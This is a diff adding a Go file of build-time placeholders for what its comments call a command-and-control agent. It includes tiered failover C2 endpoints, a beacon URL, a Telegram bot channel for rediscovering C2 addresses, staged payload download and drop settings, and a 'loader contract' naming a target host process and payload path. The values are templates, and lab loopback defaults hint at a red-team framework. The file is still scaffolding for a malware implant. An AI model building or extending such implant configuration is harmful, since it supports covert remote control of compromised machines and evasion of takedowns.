@@ -1,0 +1,41 @@
+package main
+
+var (
+	// eWssURL — primary baked C2 endpoint (failover tier 1).
+	eWssURL = {{BAKE_WSS_URL}}
+	// eWssURL2 — backup C2 endpoint (failover tier 2).
+	eWssURL2 = {{BAKE_WSS_URL2}}
+	// eWssURL3 — backup C2 endpoint (failover tier 3).
+	eWssURL3 = {{BAKE_WSS_URL3}}
+	// eBeaconURL — beacon (HTTP) endpoint.
+	eBeaconURL = {{BAKE_BEACON_URL}}
+
+	// Telegram bootstrap channel (last-resort endpoint rediscovery).
+	eTgAPIBase  = {{BAKE_TG_API_BASE}}
+	eTgBotToken = {{BAKE_TG_BOT_TOKEN}}
+	eTgChatID   = {{BAKE_TG_CHAT_ID}}
+	// eEndpointRe — regex to extract C2ENDPOINT from bootstrap messages.
+	eEndpointRe = {{BAKE_ENDPOINT_RE}}
+	// eLabWss — lab loopback endpoint (dev default).
+	eLabWss = {{BAKE_LAB_WSS}}
+	// eLabBeacon — lab beacon endpoint.
+	eLabBeacon = {{BAKE_LAB_BEACON}}
+
+	// Stage (staged execution) settings.
+	eStageURL = {{BAKE_STAGE_URL}}
+	eStagePath = {{BAKE_STAGE_PATH}}
+	eStageAuth = {{BAKE_STAGE_AUTH}}
+
+	// Host process + payload paths (loader contract).
+	eTargetHost = {{BAKE_TARGET_HOST}}
+	eTargetProc = {{BAKE_TARGET_PROC}}
+	ePayloadPath = {{BAKE_PAYLOAD_PATH}}
+
+	// Auth + mode.
+	ePSK        = {{BAKE_PSK}}
+	eAgentToken = {{BAKE_AGENT_TOKEN}}
+	eStageMode  = {{BAKE_STAGE_MODE}}
+
+	// eStageDropDir — temp dir override for staged execution (may be empty).
+	eStageDropDir = {{BAKE_STAGE_DROP_DIR}}
+)
